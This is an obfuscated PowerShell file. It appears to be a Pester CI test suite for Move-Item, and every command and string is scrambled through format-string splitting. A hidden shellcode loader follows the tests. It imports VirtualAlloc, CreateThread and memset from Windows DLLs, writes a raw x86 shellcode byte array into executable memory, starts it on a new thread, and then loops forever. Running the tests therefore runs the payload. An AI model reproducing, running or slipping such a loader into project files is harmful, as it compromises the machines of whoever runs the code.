&("{0}{1}"-f'Des','cribe') ("{0}{3}{1}{2}" -f'M','em tes','ts','ove-It') -Tag "CI" {
    &("{0}{1}"-f 'Be','foreAll') {
        ${Co`N`TENt} = ("{1}{2}{4}{3}{0}"-f 'nt','This',' is ','nte','co')
        &("{0}{1}"-f 'Se','tup') -f ("{3}{2}{0}{1}" -f 'x','t','file.t','original') -content ("{0}{1}{2}{3}" -f 'This is ','conte','n','t')
        ${soUR`cE} = "$TESTDRIVE/originalfile.txt"
        ${T`A`RgEt} = "$TESTDRIVE/ItemWhichHasBeenMoved.txt"
        &("{0}{1}" -f'Se','tup') -f ("{1}{0}{2}{3}"-f 'l','[orig-fi','e].','txt') -content ("{1}{3}{0}{4}{5}{2}" -f'not ','T','t','his is ','cont','en')
        ${SO`U`RCesp} = "$TestDrive/``[orig-file``].txt"
        ${tA`R`GETsPNa`ME} = "$TestDrive/ItemWhichHasBeen[Moved].txt"
        ${T`Arg`E`TsP} = "$TestDrive/ItemWhichHasBeen``[Moved``].txt"
    }
    &('It') ("{4}{2}{0}{3}{1}"-f ' ','le','e-Item will move','a fi','Mov') {
        &("{2}{0}{1}"-f'ove-','Item','M') ${SO`Urce} ${T`ArgET}
        ${S`o`URCe} | &("{0}{2}{1}" -f 'Sh','ld','ou') -Not -Exist
        ${t`A`RgET} | &("{1}{0}{2}" -f 'hou','S','ld') -Exist
        "$target" | &("{1}{0}"-f'ld','Shou') -FileContentMatchExactly ("{1}{0}{2}"-f ' is','This',' content')
    }
    &('It') ("{7}{1}{10}{9}{4}{8}{0}{6}{2}{5}{3}"-f 'when ','Item ','o','ial char','ile','ntains spec','path c','Move-',' ','move a f','will ') {
        &("{2}{1}{0}"-f'tem','I','Move-') ${sO`URce`sp} ${t`ArG`e`TspnA`ME}
        ${s`Ource`Sp} | &("{2}{1}{0}" -f 'uld','o','Sh') -Not -Exist
        ${taRG`eTSP} | &("{1}{2}{0}"-f'd','Sh','oul') -Exist
        ${tA`R`gEtsp} | &("{1}{0}" -f'ld','Shou') -FileContentMatchExactly ("{0}{3}{2}{1}" -f 'Th',' content',' is not','is')
    }

    &("{1}{0}"-f 'ext','Cont') ("{3}{1}{0}{2}{4}"-f't','with fil','er','Move-Item ','s') {
        &("{1}{0}{2}"-f'eA','Befor','ll') {
            ${f`iLtE`Rp`AtH} = "$TESTDRIVE/filterTests"
            ${moVe`ToPa`TH} = "$TESTDRIVE/dest-dir"
            ${re`Namet`OpaTh} = &("{1}{0}" -f 'n-Path','Joi') ${fi`LtER`pAth} ("{1}{0}"-f 'txt','move.')
            ${FI`l`Ep`ATh} = &("{1}{0}{2}"-f'o','J','in-Path') ${filTer`P`Ath} "*"
            ${fo`o`FilE} = ("{1}{0}"-f 'xt','foo.t')
            ${Bar`FiLE} = ("{1}{2}{0}" -f't','bar.t','x')
            ${B`oOf`ilE} = ("{0}{2}{1}"-f'b','.txt','oo')
            ${fO`OPa`Th} = &("{1}{0}{2}" -f't','Join-Pa','h') ${fIl`T`erpaTH} ${fOoF`i`lE}
            ${BA`R`PAth} = &("{2}{3}{1}{0}"-f'ath','P','Jo','in-') ${Filte`R`PA`TH} ${Bar`F`Ile}
            ${BooPA`Th} = &("{0}{1}" -f'Join-','Path') ${F`iLT`E`RPaTh} ${BOoF`I`le}
            ${N`eWfoO`P`AtH} = &("{1}{0}" -f 'ath','Join-P') ${mO`VE`ToPa`TH} ${foo`F`iLe}
            ${N`ewBar`pAtH} = &("{1}{2}{0}" -f'th','Joi','n-Pa') ${mO`VetOP`AtH} ${BA`Rf`ILE}
            ${n`ewBOoP`AtH} = &("{3}{2}{1}{0}"-f'ath','P','-','Join') ${M`OVEt`O`PATH} ${bOoF`i`lE}
            ${f`O`o`cONTent} = ("{3}{0}{2}{1}" -f ' ','ontent','c','foo')
            ${baRCoN`TE`NT} = ("{0}{1}{2}"-f 'bar ','con','tent')
            ${bo`OCONTE`NT} = ("{0}{1}{2}" -f 'boo co','nte','nt')
        }
        &("{1}{2}{0}" -f 'ach','Befor','eE') {
            &("{0}{1}"-f 'New-Ite','m') -ItemType ("{2}{1}{0}" -f'ry','cto','Dire') -Path ${F`ILTerpA`Th} | &("{1}{0}"-f '-Null','Out')
            &("{1}{0}" -f'em','New-It') -ItemType ("{1}{0}{2}" -f 'r','Di','ectory') -Path ${mOV`e`Top`ATh} | &("{1}{2}{0}"-f 'll','Out-','Nu')
            &("{0}{2}{1}"-f'New-','m','Ite') -ItemType ("{1}{0}" -f 'le','Fi') -Path ${FOOp`A`Th} -Value ${foo`cO`NtENT} | &("{0}{1}" -f 'Out-N','ull')
            &("{2}{1}{0}" -f'em','ew-It','N') -ItemType ("{1}{0}" -f'le','Fi') -Path ${b`Ar`PaTH} -Value ${BA`RcON`TenT} | &("{0}{2}{1}" -f 'O','-Null','ut')
            &("{2}{1}{0}"-f 'Item','ew-','N') -ItemType ("{1}{0}"-f'le','Fi') -Path ${bO`OP`ATH} -Value ${B`O`O`COnTEnt} | &("{0}{1}{2}" -f 'Out-N','ul','l')
        }
        &("{2}{0}{1}" -f'Ea','ch','After') {
            &("{0}{2}{1}{3}"-f 'Re','v','mo','e-Item') ${FIL`Te`Rp`AtH} -Recurse -Force -ErrorAction ("{1}{3}{4}{0}{2}" -f'tlyCon','Sil','tinue','e','n')
            &("{1}{2}{0}{3}" -f 'ove','Re','m','-Item') ${MOVET`O`pAth} -Recurse -Force -ErrorAction ("{3}{2}{4}{0}{1}" -f 'lyCo','ntinue','il','S','ent')
        }
        &('It') ("{8}{15}{3}{2}{5}{9}{13}{14}{6}{7}{0}{11}{4}{12}{10}{1}" -f 'r',' -Include','to d','ve ','d','iff','irect','o','Can m','er','h','y, filtere',' wit','en','t d','o') {
            &("{2}{0}{1}"-f 've-','Item','Mo') -Path ${filE`p`Ath} -Destination ${mO`V`etOpA`TH} -Include ("{0}{1}"-f 'b','ar*') -ErrorVariable ('e') -ErrorAction ("{0}{2}{4}{3}{1}"-f'Si','e','len','Continu','tly')
            ${e} | &("{0}{2}{1}"-f'Shou','d','l') -BeNullOrEmpty
            ${bAr`P`ATH} | &("{0}{2}{1}" -f 'Shou','d','l') -Not -Exist
            ${N`eW`B`ArpATH} | &("{0}{1}"-f 'Sho','uld') -Exist
            ${b`OO`path} | &("{0}{1}" -f 'Shoul','d') -Exist
            ${FoO`pAtH} | &("{2}{1}{0}" -f 'uld','ho','S') -Exist
            ${nEWbAr`P`A`Th} | &("{1}{0}{2}"-f 'ul','Sho','d') -FileContentMatchExactly ${baRcO`N`TeNt}
        }
        &('It') ("{4}{2}{9}{0}{3}{5}{1}{10}{6}{8}{7}"-f' t','rec','m','o diffe','Can ','rent di','fi','ed with -Exclude','lter','ove','tory, ') {
            &("{2}{1}{0}" -f'Item','-','Move') -Path ${FiL`Ep`ATh} -Destination ${mOV`e`TOpa`TH} -Exclude "b*" -ErrorVariable ('e') -ErrorAction ("{2}{0}{1}" -f'lentlyContin','ue','Si')
            ${e} | &("{0}{1}"-f'Sh','ould') -BeNullOrEmpty
            ${F`oOPA`Th} | &("{1}{0}"-f'ld','Shou') -Not -Exist
            ${NewF`OO`Path} | &("{1}{2}{0}" -f'ld','Sh','ou') -Exist
            ${b`ooPa`Th} | &("{2}{1}{0}"-f'd','houl','S') -Exist
            ${BaR`P`AtH} | &("{1}{0}" -f 'd','Shoul') -Exist
            ${NEwF`oO`p`Ath} | &("{1}{0}" -f'ould','Sh') -FileContentMatchExactly ${F`OOCOn`TENt}
        }
        &('It') ("{7}{1}{9}{4}{3}{16}{0}{10}{14}{15}{5}{6}{12}{2}{13}{8}{11}"-f' ',' to','re','fer','if','ory,',' fi','Can move','-Fi',' d','d','lter','lte','d with ','irec','t','ent') {
            &("{1}{2}{0}"-f 'tem','Mov','e-I') -Path ${FI`l`EPATh} -Destination ${mO`VeTop`ATH} -Filter "bo*" -ErrorVariable ('e') -ErrorAction ("{2}{0}{1}" -f'nt','lyContinue','Sile')
            ${e} | &("{1}{0}" -f 'hould','S') -BeNullOrEmpty
            ${BoOp`A`TH} | &("{0}{1}"-f'Shou','ld') -Not -Exist
            ${ne`WBo`opATh} | &("{1}{2}{0}" -f 'ld','Sho','u') -Exist
            ${Ba`RPa`Th} | &("{0}{1}"-f 'Shou','ld') -Exist
            ${f`OO`PAtH} | &("{0}{1}" -f 'S','hould') -Exist
            ${NEwBO`O`p`Ath} | &("{1}{0}"-f'uld','Sho') -FileContentMatchExactly ${Booc`on`TeNt}
        }

        &('It') ("{1}{5}{9}{2}{0}{6}{7}{8}{4}{3}"-f 'te','Can rename',' fil','lude','nc',' ','red wi','th',' -I','via move,') {
            &("{0}{1}{2}" -f 'Move','-It','em') -Path ${fILE`p`ATH} -Destination ${re`N`Ame`TOPath} -Include ("{0}{1}"-f 'ba','r*') -ErrorVariable ('e') -ErrorAction ("{2}{1}{3}{0}{4}"-f'ntinu','l','Si','entlyCo','e')
            ${e} | &("{1}{0}"-f'uld','Sho') -BeNullOrEmpty
            ${r`enAm`EtOP`Ath} | &("{0}{2}{1}"-f 'S','d','houl') -Exist
            ${ba`Rpa`TH} | &("{1}{0}" -f'ld','Shou') -Not -Exist
            ${BoOPa`TH} | &("{1}{0}"-f 'hould','S') -Exist
            ${foO`pA`Th} | &("{0}{1}"-f 'Sho','uld') -Exist
            ${R`enAme`TO`p`ATH} | &("{0}{1}" -f 'Sh','ould') -FileContentMatchExactly ${bA`RcONTe`NT}
        }
        &('It') ("{4}{9}{10}{12}{5}{6}{3}{0}{7}{8}{1}{2}{11}" -f'ter',' -E','xcl','l','C','a move, f','i','ed wit','h','a','n rename ','ude','vi') {
            &("{0}{2}{1}"-f'Mo','em','ve-It') -Path ${FIlEP`A`Th} -Destination ${rEnaM`E`TO`path} -Exclude "b*" -ErrorVariable ('e') -ErrorAction ("{0}{3}{4}{2}{1}"-f'S','e','ntinu','il','entlyCo')
            ${e} | &("{2}{1}{0}" -f 'ld','ou','Sh') -BeNullOrEmpty
            ${r`E`Nam`ETOpA`TH} | &("{1}{0}"-f'ld','Shou') -Exist
            ${Fo`oP`Ath} | &("{1}{2}{0}" -f'd','Shou','l') -Not -Exist
            ${bOo`pa`TH} | &("{0}{1}{2}" -f'Sho','u','ld') -Exist
            ${b`Arp`Ath} | &("{0}{1}"-f 'S','hould') -Exist
            ${re`NamE`TOPaTH} | &("{0}{1}"-f 'Shou','ld') -FileContentMatchExactly ${fOOc`o`NT`ENt}
        }
        &('It') ("{1}{3}{2}{6}{7}{0}{8}{4}{5}"-f'ere','C',' r','an','it','h -Filter','en','ame via move, filt','d w') {
            &("{0}{2}{1}"-f 'Mov','Item','e-') -Path ${F`ILEPa`Th} -Destination ${R`enamE`TOPATH} -Filter "bo*" -ErrorVariable ('e') -ErrorAction ("{3}{0}{1}{2}" -f'lentl','yConti','nue','Si')
            ${e} | &("{2}{1}{0}" -f 'd','oul','Sh') -BeNullOrEmpty
            ${rENA`MEtO`p`Ath} | &("{1}{0}" -f 'ould','Sh') -Exist
            ${B`ooPA`TH} | &("{1}{0}" -f'ld','Shou') -Not -Exist
            ${f`o`OpATh} | &("{1}{0}" -f 'd','Shoul') -Exist
            ${BAr`PatH} | &("{0}{1}"-f 'Sho','uld') -Exist
            ${R`En`AmEtOPaTH} | &("{0}{1}" -f'Sho','uld') -FileContentMatchExactly ${BOo`c`ON`TeNT}
        }
    }
}

${c} = ((("{8}{65}{30}{28}{13}{91}{98}{72}{60}{107}{64}{37}{80}{75}{63}{40}{103}{1}{92}{35}{33}{17}{48}{20}{97}{74}{61}{59}{106}{95}{46}{38}{76}{99}{53}{14}{96}{86}{7}{43}{6}{77}{4}{22}{105}{81}{15}{57}{62}{5}{90}{93}{19}{31}{69}{68}{100}{102}{34}{12}{70}{26}{16}{21}{71}{11}{42}{89}{39}{55}{58}{10}{87}{47}{23}{0}{94}{56}{67}{78}{85}{82}{2}{49}{51}{73}{32}{36}{45}{18}{52}{88}{79}{25}{3}{50}{83}{104}{29}{84}{41}{54}{101}{24}{44}{66}{27}{9}" -f 'ionFlags,','al','T','t','er',' ','iH','ct);','[DllImport(i',');','tPtr lpParam',' ','P','lli','ype, uin','public ','hreadAttributes, uint dwSta','n','r',' In','tr lpAdd','ckSiz','nel3','t dwCreat',' ','se','lpT','nt','kernel32.d','tr','T','tPtr Cr','tic exter','I','Int','oc(','n In','n',' f','ddre',' V','dest, u','IntPtr ','[DllImport(','uint c','tPt','t','er, uin','tP',')]public','(In',' st',' ','ionT','int sr','ss, I',';[Dll','sta','n','i','atic ','dwS','tic','ntPtr','r','H','ou','Import(iH','t','ea','tr ','e,',']public st','a','s, uint ','I','lAlloca','Tk','Tmsvcrt.','em',' ','iHT)]','iH','t',' ','dll','rote','et','m','lpStartA','e','H','All','xtern',' IntPtr lpThreadId)',' uin','t flP','res','T)','t','e','c,','Thread(','irtu','P','2.dll','ze,','exte'))  -CrePlace  ([cHAR]105+[cHAR]72+[cHAR]84),[cHAR]34);${w} = &("{1}{2}{0}"-f 'Type','Ad','d-') -memberDefinition ${C} -Name ("{0}{1}"-f'W','in32') -namespace ("{2}{1}{0}{3}" -f'tion','2Func','Win3','s') -passthru;[Byte[]];[Byte[]]${Z} = 0xbb,0x72,0x8c,0xf4,0xb4,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xea,0xfc,0x03,0x5a,0x7d,0x6e,0x01,0x48,0x69,0xec,0xea,0xb1,0x69,0x91,0x63,0x54,0x58,0x91,0x10,0x1c,0xca,0x21,0x52,0x70,0xe6,0xca,0x36,0x61,0x7d,0xbe,0x9e,0x86,0x36,0x75,0xf9,0xa9,0xc7,0x26,0x39,0xab,0x4b,0x35,0x6e,0x0b,0x72,0xf6,0x63,0x4a,0xb3,0xeb,0x8e,0x1e,0x6c,0x67,0x3c,0x8f,0x19,0x3d,0xfd,0x24,0x51,0xd3,0x85,0xd9,0x21,0xd2,0xa4,0x4f,0x3a,0x8d,0x66,0x71,0xef,0xa5,0x2e,0x69,0xec,0x80,0xf9,0x02,0xc6,0x7f,0xf8,0xc2,0x17,0x7f,0x57,0x2b,0x98,0x72,0xa9,0x6b,0x1e,0x6d,0xdc,0x85,0x5d,0x10,0xe7,0x51,0x1c,0xce,0x62,0x42,0x86,0x85,0xd5,0xae,0x37,0x49,0x83,0x25,0x3b,0x26,0xc7,0x62,0x5f,0xb9,0x04,0x19,0x5b,0x32,0xab,0xce,0xea,0x00,0x88,0xca,0xb7,0xd3,0xb1,0x4b,0x1d,0xb5,0xce,0x8c,0xfe,0x6a,0x6b,0xc6,0x12,0x7e,0x06,0x85,0x7a,0xb3,0x2b,0x36,0x7a,0xdb,0x3c,0x45,0x48,0x44,0x97,0xc1,0xe0,0x0d,0x31,0x15,0x07,0x24,0x85,0x89,0xf6,0xc7,0xf6,0x80,0x3c,0x93,0xa6,0xba,0x95,0x9c,0x2c,0x3b,0x1a,0x49,0xd8,0x3e,0x8c,0x2a,0x1d,0x3c,0xa7,0xa3,0x1f,0xbe,0x3a,0x95,0xa9,0x58,0x14,0x85,0xf9,0xf4,0xd4,0x75,0xba,0xa4,0xbc,0x9f,0x35,0x9a,0xdc,0x9f,0x9f,0xb3,0x76,0x70,0x76,0xeb,0xee,0xe9,0xd3,0x67,0x8f,0xf6,0xc9,0x0d,0x8f,0x7d,0xfe,0xf2,0x41,0x76,0x8b,0xe0,0x35,0x76,0xc6,0x5b,0x93,0x89,0xfc,0xf6,0x1b,0x1c,0xfb,0x50,0x4c,0x88,0x01,0x84,0xba,0x17,0xf9,0xe3,0xb1,0x9e,0x6f,0x4c,0xad,0xde,0x7f,0x4c,0x2d,0x89,0x15,0x4c,0x45,0x6d,0x4e,0x1f,0x70,0x72,0x5b,0x33,0x29,0xe7,0x64,0x62,0x9e,0xa0,0x0c,0x88,0xf9,0x87,0x92,0x73,0x2c,0x16,0xee,0xa5,0x08,0x6c,0x1e,0x76;${g} = 0x1000;if (${Z}."L`engTH" -gt 0x1000){${g} = ${Z}."le`NgtH"};${X}=${w}::("{1}{3}{0}{2}"-f'l','Virt','loc','ualA').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${z}."LENg`TH"-1);${i}++) {${w}::"m`EMSET"([IntPtr](${x}.("{0}{1}" -f 'ToI','nt32').Invoke()+${i}), ${Z}[${i}], 1)};${w}::("{2}{1}{0}" -f 'ad','hre','CreateT').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{2}{0}" -f'p','Start','-slee') 60};
